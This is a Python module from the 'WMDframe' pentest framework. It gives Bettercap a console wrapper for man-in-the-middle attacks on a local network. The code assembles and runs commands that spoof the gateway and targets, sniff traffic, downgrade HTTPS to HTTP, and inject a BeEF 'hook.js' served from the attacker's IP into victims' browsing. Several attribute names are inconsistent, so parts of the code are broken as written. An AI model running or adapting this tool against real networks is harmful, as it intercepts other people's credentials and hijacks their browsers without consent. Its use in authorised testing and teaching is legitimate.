#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe


# LIBRARIES
import os                   # Running bettercap
from time import sleep      # Just counting down before launch
from core.colors import bc as bc
import core.modules as cmodules
import core.commands as comm
# END LIBRARIES

# VARIABLES
global sop                            # Main class for all options
global bettercappath
bettercappath = "/usr/bin/bettercap"  # Change accordingly
global beefpath
beefpath = '/usr/bin/beef'  # Change accordingly
# END VARIABLES


# OPTIONS
class options():
    Author = "Thomas TJ (TTJ)"
    Name = 'Bettercap'
    Call = 'bettercap'
    Modulename = "pyconsole_bettercap"
    Version = "0.1"
    Description = "Python console for Bettercap"
    Category = 'sniff'
    Type = 'sin'
    DateCreation = "13/11/2016"
    LastModification = "13/11/2016"
    License = "MIT"

    def __init__(self, interface, gateway, sniffer, proxy, target, sniff_log, beef):
        self.interface = interface
        self.gateway = gateway
        self.sniffer = sniffer
        self.proxy = proxy
        self.target = target
        self.sniff_log = sniff_log
        self.beef = beef
        self.show_all()

    # Possible options
    def poss_opt(self):
        return ('interface', 'gateway', 'sniffer', 'proxy', 'target', 'sniff_log', 'beef')

    def show_opt(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + ("%-*s %-*s %-*s %s" % (12, "OPTION", 6, "RQ", 14, "VALUE", "DESCRIPTION")) + bc.ENDC
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "------", 6, "--", 14, "-----", "-----------"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "interface:", 6, "y", 14, self.interface, "Interfaces " + "ss"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "gateway:", 6, "y", 14, self.gateway, "Gateway, e.g. 192.168.1.1"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "sniffer:", 6, "n", 14, self.sniffer, "Activate sniffer - why not? (y/n)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "proxy:", 6, "n", 14, self.proxy, "Downgrade HTTPS to HTTP for sniffing (y/n)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "target:", 6, "n", 14, self.target, "Target IPs. Separate with ',' or subnet xx\\24"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "invoke:", 6, "n", 14, self.sniff_log, "Logfile name"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (12, "beed:", 6, "n", 14, self.beed, "Use beef"))
            + "\n"
            )

    # Show commands
    def show_commands(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + "COMMANDS:" + bc.ENDC
            + "\n\t" + "---------"
            + "\n\t" + ("%-*s ->\t%s" % (9, "run", "Run the script"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "info", "Information"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "help", "Help"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "so", "Show options"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "sa", "Show module info"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "exit", "Exit"))
            + "\n"
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


# RUN BETTERCAP
def run_bc():
    if sop.beef == 'y':
        comm.runCommand3('beef', 'Start_beef')
        local_ip = comm.getLocalIP(sop.interface_n)
        print('\t[!]  Check the beef window and insert path to "hook.js"')
        print('\t[!]  Press enter to select: "http://' + local_ip[0] + ':3000/hook.js"')
        beef_js_path = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "hook.js path:" + bc.ENDC + " ")
        if not beef_js_path:
            beef_js_path = 'http://' + local_ip[0] + ':3000/hook.js'
        bettercap_beef_arg = '--proxy-module injectjs --js-url "' + beef_js_path + '" '

    # Start bettercap
    if getattr(sop, 'interface_s'):
        opt_com = '--interface ' + getattr(sop, 'interface_s') + ' '

    if getattr(sop, 'gateway'):
        opt_com += '--gateway ' + getattr(sop, 'gateway') + ' '

    if getattr(sop, 'target'):
        opt_com += '--target ' + getattr(sop, 'target') + ' '

    if getattr(sop, 'sniffer').lower() == 'y':
        opt_com += '--sniffer' + ' '

    if getattr(sop, 'proxy').lower() == 'y':
        opt_com += '--proxy' + ' '

    if getattr(sop, 'sniff_log'):
        opt_com += '--log ' + getattr(sop, 'sniff_log') + ' --log-timestamp' + ' '

    if beef_js_path:
        opt_com += bettercap_beef_arg

    if sop.args_sniff:
        opt_com += sop.args_sniff

    command = (bettercappath + ' ' + opt_com)

    print(
        "\n"
        + "\t" + "Loading     : Bettercap"
        + "\n\t" + "Command     : " + bc.BOLD + command + bc.ENDC
        + "\n\t" + "Starting in : 2 seconds"
        + "\n\t"
        )
    sleep(2)
    os.system(command)
# END BETTERCAP


def info():
    print(
        ''
        + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
        + '\n\t' + '---------'
        + '\n\t' + 'Spoofer, choose: ARP, ICMP, NONE:'
        + '\n\t' + '  --spoofer ARP'
        + '\n\t' + 'Silent running:'
        + '\n\t' + '  --silent'
        + '\n'
        )


# CONSOLE
def console():
    valueQ = input("  " + bc.FAIL + "mdw" + bc.ENDC + "@" + bc.FAIL + "bettercap:" + bc.ENDC + " ")
    userinput = valueQ.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'help' in userinput[:1]:
        print('\n\n###########################################################')
        print('#  BETTERCAP')
        print('###########################################################\n')
        os.system(bettercappath + ' --help')
        print('\n\n###########################################################')
        print('#  BEEF')
        print('###########################################################\n')
        os.system(beefpath + ' --help')
        print('\n\n###########################################################\n\n')
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run_bc()
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')
        if useroption not in sop.poss_opt():
            print(bc.WARN + "\n    Error, no options for: " + useroption + "\n" + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + "\n")
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    else:
        print(bc.WARNING + "\n    error\t> " + str(userinput[:1]) + "\n" + bc.ENDC)
    # Always return to console:
    console()
# END console


# STARTER
def main():
    if os.getuid() != 0:
        print("r00tness is needed due to packet sniffing!")
        print("Run the script again as root/sudo")
        return None
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkInstalled(bettercappath)
    comm.checkInstalledOpt(beefpath)
    comm.checkNetConnectionV()
    global sop
    local_ip = comm.getLocalIP('')
    gateway = comm.getGateway()
    sop = options(local_ip[0], gateway, "y", "y", "", "", '')
    console()
